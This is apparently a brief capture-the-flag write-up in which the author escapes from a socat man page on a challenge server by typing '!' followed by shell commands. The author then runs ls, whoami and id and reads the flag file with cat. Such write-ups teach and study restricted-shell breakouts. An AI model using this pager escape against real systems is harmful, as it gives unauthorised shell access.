The server we connect to it, shows help page of `socat` command.

There's a trick for **man pages, less, more, ...** commands that you can use exclamation mark `!` at the end of screen to access shell. For example:

`Manual page socat(1) line 1 (press h for help or q to quit)`

But if you use `!` and type a command, it will give you shell access. Like these:

`Manual page socat(1) line 1 (press h for help or q to quit)!ls`

`Manual page socat(1) line 1 (press h for help or q to quit)!whoami`

`Manual page socat(1) line 1 (press h for help or q to quit)!id`

For this challenge, after searching through files, I found this file which contains our flag:

`Manual page socat(1) line 1 (press h for help or q to quit)!cat /home/moar/disable_dmz.sh`